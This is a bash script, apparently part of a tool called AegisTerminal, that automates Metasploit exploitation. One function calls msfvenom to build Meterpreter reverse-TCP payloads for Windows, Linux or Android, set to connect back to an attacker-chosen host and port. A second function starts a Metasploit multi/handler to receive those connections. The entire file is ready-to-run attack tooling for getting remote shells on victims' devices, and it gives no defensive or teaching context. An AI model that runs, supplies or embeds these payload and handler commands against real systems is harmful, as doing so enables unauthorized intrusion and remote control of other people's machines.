#!/bin/bash

# AegisTerminal - Exploitation Module (Metasploit & msfvenom)

generate_payload() {
    local platform=$1
    local lhost=$2
    local lport=$3
    local output=$4
    
    echo -e "${YELLOW}[*] Generating $platform payload...${NC}"
    case $platform in
        "windows")
            msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o "$output"
            ;;
        "linux")
            msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf -o "$output"
            ;;
        "android")
            msfvenom -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -o "$output"
            ;;
    esac
    echo -e "${GREEN}[+] Payload saved to: $output${NC}"
}

start_handler() {
    local lhost=$1
    local lport=$2
    local payload=$3
    
    echo -e "${YELLOW}[*] Starting Metasploit Multi-Handler...${NC}"
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $payload; set LHOST $lhost; set LPORT $lport; exploit"
}
